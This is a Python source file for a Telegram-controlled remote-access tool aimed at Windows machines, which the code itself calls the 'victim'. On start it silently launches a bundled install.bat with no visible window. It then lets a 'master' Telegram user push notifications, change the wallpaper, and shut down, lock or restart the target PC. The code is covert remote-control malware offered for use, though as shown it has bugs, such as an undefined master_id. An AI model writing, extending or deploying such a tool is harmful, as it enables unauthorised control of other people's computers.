from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, CallbackContext
from winNotify import sendNotification
from wallpaper import Wallpaper
from system import system
import os
import subprocess
import sys

listening_for_messages = False
listening_system_commands = False

def startApp():
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(__file__))
    bat_path = os.path.join(base_path, 'install.bat')
    subprocess.Popen(['cmd.exe', '/c', 'start', '/b', bat_path], creationflags=subprocess.CREATE_NO_WINDOW)

    botToken = "<Your-Telegram-Bot-Token>"
    # master_id = your-telegram-userID

    botCommands = {
        'hello': 'greetings',
        'status': 'victim running status',
        'notify': 'turn on notification mode',
        'system': 'turn on system command mode',
        'stopSystem': 'turn off system command mode',
        'stopNotify': 'turn off notification mode',
        'changewp': "changeWallpaper",
    }

    async def Messages(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        global listening_for_messages
        command = update.message.text
        if listening_for_messages:
            sendNotification(command)
            await update.message.reply_text("done")
        elif listening_system_commands:
            if command in ['shutdown', 'lock', 'restart']:
                system(command)
                await update.message.reply_text("done")
            else:
                await update.message.reply_text("Not a system command")
        else:
            await update.message.reply_text("command not found!")

    async def command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        global listening_for_messages, listening_system_commands

        command = update.message.text

        if update.effective_user.id == master_id:
            if command == "/hello":
                replyText = f'{update.effective_user.first_name}!'
                await update.message.reply_text(replyText)
            elif command == "/notify":
                listening_for_messages = True
                await update.message.reply_text("Notification Activated!")
            elif command == "/system":
                listening_system_commands = True
                await update.message.reply_text("System Commands Activated!")
            elif command == "/status":
                await update.message.reply_text("System is running")
            elif command == "/changewp":
                Wallpaper()
                await update.message.reply_text("Wallpaper Changed")
            elif command == "/stopNotify":
                listening_for_messages = False
                await update.message.reply_text("Notification Stopped")
            elif command == "/stopSystem":
                listening_system_commands = False
                await update.message.reply_text("System commands Stopped")
            else:
                await update.message.reply_text(f'Command not found: {command}')
        else:
            await update.message.reply_text("You are not my master.")

    async def error_handler(update: Update, context: CallbackContext) -> None:
        await context.bot.send_message(chat_id=master_id, text="An error occurred. Please try again.")

    app = ApplicationBuilder().token(botToken).build()

    for cmd in botCommands.keys():
        app.add_handler(CommandHandler(cmd, command))

    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, Messages))
    app.add_error_handler(error_handler)

    app.run_polling()

if __name__ == "__main__":
    startApp()
